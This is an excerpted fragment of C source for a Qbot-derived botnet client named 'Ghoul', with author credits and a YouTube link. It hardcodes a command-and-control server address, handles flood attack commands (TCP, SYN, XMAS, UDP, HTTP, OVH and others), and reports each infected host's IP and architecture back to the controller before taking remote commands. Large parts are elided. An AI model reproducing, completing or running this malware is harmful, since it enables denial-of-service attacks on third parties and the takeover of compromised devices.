...
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))                                                                                                                                                                                                                                                                             //Ghoul Qbot Made by Edo
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define std_packet 1460
//Edos Ghoul Source
//My Yt: https://www.youtube.com/channel/UCwLwJQsUeWkk5BOmgvKPJqA
unsigned char *commServer[] = {"66.42.116.24:1111"};
...
{
       if(!strcmp(argv[0], "TCP") || !strcmp(argv[0], "ACK") || !strcmp(argv[0], "XMAS") || !strcmp(argv[0], "SYN") || !strcmp(argv[0], "STOMP"))
 ...
 if(!strcmp(argv[0], "UDPREG") || !strcmp(argv[0], "UDPHEX") || !strcmp(argv[0], "UDPRAW"))
		{
		...
		if(!strcmp(argv[0], "HTTPSTOPM") || !strcmp(argv[0], "HTTP"))
		{
        ...
        if(!strcmp(argv[0], "STD") || !strcmp(argv[0], "OVH"))
	    {
        ...
        if(!strcmp(argv[0], "STOP") || !strcmp(argv[0], "kill"))
		{
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "\e[0m[\e[38;5;93mGhoul.\e[0m][\e[1;31m%s\e[0m]\e[1;31m:\e[0m[\e[1;31m%s\e[0m] \e[1;31m>\e[0m [\e[1;31m%s\e[0m]", inet_ntoa(ourIP), getPortz(), getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        ...
                        if(*message == '!')
                        {
                                ...
                                *message = 0x00;
                                ...
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");/*Edo*/
                                params[0] = command;
